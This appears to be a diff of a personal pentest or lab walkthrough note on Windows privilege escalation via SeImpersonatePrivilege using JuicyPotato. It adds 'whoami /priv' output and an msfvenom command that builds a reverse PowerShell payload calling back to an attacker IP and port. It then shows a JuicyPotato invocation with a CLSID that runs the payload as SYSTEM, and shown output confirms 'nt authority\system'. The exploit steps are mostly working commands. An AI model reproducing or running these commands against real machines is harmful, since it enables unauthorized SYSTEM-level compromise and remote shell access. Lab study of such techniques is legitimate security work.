@@ -1,12 +1,30 @@
 # SeImpersonate and SeAssignPrimaryToken privilege
 
-## SeImpersonate and SeAssignPrimaryToken privilege
-
 **Token**: every process has a token that has information about the account that is running it and it’s store in memory
 
 > **we ask token from `WinLogon` process**
 
 ## Exploit **JuicyPotato**
+
+### Debug programs right
+
+```powershell
+PS C:\Users\Public> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+**SeImpersonatePrivilege**        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+```
 
 #### **Connecting with MSSQLClient.py**
 
@@ -154,4 +172,24 @@ C:\Windows\system32>whoami
 
 whoami
 nt authority\system
+```
+
+***
+
+## JuicyPotato
+
+we will try to take a reverse shell with System privilege
+
+Create a reverse shell
+
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.212 lport=1111 > 1.bat
+
+```
+
+execute shell on windows machine
+
+```powershell
+# dont forget to open listenr on Attacker box
+.\JuicyPotato.exe -l 5337 -p C:\Users\Public\1.bat -t * -clisd "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
 ```
